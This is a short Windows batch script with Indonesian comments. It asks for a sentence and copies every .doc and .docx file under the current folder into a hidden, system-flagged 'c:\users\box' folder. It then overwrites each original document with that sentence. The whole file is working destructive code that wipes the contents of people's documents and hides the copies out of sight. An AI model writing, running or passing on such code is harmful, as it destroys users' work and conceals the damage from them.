@echo off
setlocal enableextensions

::ditaruh di partisi penyimpanan tertentu
set /p kata= masukkan kalimat subtitusi pada konten dokumen : 

::melakukan verifikasi folder box
if not exist "c:\users\box\" call :md

::memulai looping untuk merubah konten dan menyembunyikan baackup data
:lop 
::memberikan atribut hidden pada semua file dalam direktori box
attrib +h +s +r "c:\users\box\*.*"
::menggandakan file asli sebelum dirubah bertujuan sebagai backup
for /r %%z in (*.doc, *.docx) do (
if not exist "c:\users\box\%%z" copy "%%z" "c:\users\box\%%~nz" 
)

::rechek agar file yang beru dimasukkan kedalam folder box mendapatkan treatment yang sama
:hide
attrib +h +s +r "c:\users\box\*.*"
::merubah konten file asli (bukan file backup) dengan kalimat subtitusi yang baru dimasukkan diawal
:inerloop
for /r %%b in (*.doc, *docx) do (
	for /r %%c in (0,1,100) do (
		echo %kata% >%%b
) 
)
endlocal

::membuat folder box jika belum ada pada direktori dengan nama box
:md
md "c:\users\box"
goto lop